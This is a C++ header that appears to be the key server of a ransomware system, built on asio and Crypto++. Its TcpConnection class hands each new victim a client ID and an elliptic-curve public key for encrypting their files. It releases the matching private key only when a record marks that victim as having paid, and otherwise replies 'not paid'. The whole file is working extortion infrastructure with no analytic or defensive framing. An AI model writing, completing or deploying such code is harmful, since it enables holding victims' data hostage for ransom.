#pragma once
#include <memory>
#include <asio.hpp>
#include <iostream>
#include <cryptopp/filters.h>
#include <cryptopp/base64.h>
#include <memory>

#include <iostream>

#include "Commands.h"
#include "RansomManager.h"


class TcpConnection : public std::enable_shared_from_this<TcpConnection>
{
public:
	typedef std::shared_ptr<TcpConnection> pointer;

private:
	asio::ip::tcp::socket socket_;
	RansomManager& ransomManager_;

public:
	static pointer create(asio::io_service& io_service, RansomManager& ransomManager)
	{
		return pointer(new TcpConnection(io_service, ransomManager));
	}

	asio::ip::tcp::socket& socket()
	{
		return socket_;
	}

	void start()
	{
		auto command = std::make_shared<Commands>();
		auto self = shared_from_this();
		std::cout << "conn: " << this << "\n";
		socket().async_read_some(asio::buffer(reinterpret_cast<uint8_t*>(command.get()), sizeof(Commands)), [self, command](const asio::error_code& error, std::size_t size) {
			if (error) 
			{
				std::cerr << error.value() << " " << error.message() << "\n";
				return;
			}
			std::cout << "conn: " << self.get() << "\n";
			switch (*command)
			{
			case Commands::GET_PUBLIC_KEY:
				std::cout << "Command GET_PUBLIC_KEY\n";
				self->sendPublicKey();
				break;
			case Commands::GET_PRIVATE_KEY:
				std::cout << "Command GET_PRIVATE_KEY\n";
				self->sendPrivateKey();
				break;
			default:
				std::cerr << "Unknown Command " << command << "\n";
				break;
			}
		});
	}

	void sendPublicKey()
	{
		std::cout << "conn: " << this << "\n";
		RansomEntry ransomEntry = ransomManager_.createEntry();
		std::string publicKeyContent;
		ransomEntry.publicKey().GetGroupParameters().GetCurve().EncodePoint(CryptoPP::Base64Encoder(new CryptoPP::StringSink(publicKeyContent)), ransomEntry.publicKey().GetPublicElement(), true);
		publicKeyContent.erase(std::remove(publicKeyContent.begin(), publicKeyContent.end(), '\n'), publicKeyContent.end());
		
		auto messageContent = std::make_shared<std::string>();
		*messageContent += std::to_string(ransomEntry.clientId());
		*messageContent += "\n" + publicKeyContent;

		std::cout << "Sending data:\n" << *messageContent << "\n\n";

		auto self = shared_from_this();
		socket_.async_write_some(asio::buffer(*messageContent), [self, messageContent](const asio::error_code& error, std::size_t bytes_written) {
			if (error)
			{
				std::cerr << error.message() << "\n";
				return;
			}
			self->socket().shutdown(asio::ip::tcp::socket::shutdown_both);
			self->socket().close();
		});
	}

	void sendPrivateKey()
	{
		auto clientId = std::make_shared<std::uint64_t>();
		auto self = shared_from_this();
		auto& ransomManager = this->ransomManager_;
		socket_.async_read_some(asio::buffer(reinterpret_cast<char*>(clientId.get()), sizeof(clientId)), [self, &ransomManager, clientId](const asio::error_code& error, std::size_t bytes_read) {
			if (error)
			{
				std::cerr << error.message() << "\n";
				return;
			}
			RansomEntry ransomEntry = ransomManager.getEntry(*clientId);
			auto privateKeyContent = std::make_shared<std::string>();
			if (ransomEntry.hasPaid())
			{
				std::string raw_privatekey;
				ransomEntry.privateKey().GetPrivateExponent().DEREncode(CryptoPP::StringSink(raw_privatekey));

				CryptoPP::StringSource(raw_privatekey, true,
					new CryptoPP::Base64Encoder(
						new CryptoPP::StringSink(*privateKeyContent)
					)
				);
			}
			else
			{
				*privateKeyContent = "not paid";
			}
			std::cout << "Sending data:\n" << *privateKeyContent << "\n\n";
			self->socket().async_write_some(asio::buffer(*privateKeyContent), [self, privateKeyContent](const asio::error_code& error, std::size_t bytes_written) {
				if (error)
				{
					std::cerr << error.message() << "\n";
					return;
				}

				self->socket().shutdown(asio::ip::tcp::socket::shutdown_both);
				self->socket().close();
			});
		});
		
	}
private:
	TcpConnection(asio::io_service& io_service, RansomManager& ransomManager)
		: socket_(io_service)
		, ransomManager_(ransomManager)
	{
		std::cout << "RansomManager: " << &ransomManager_;
	}

	
};

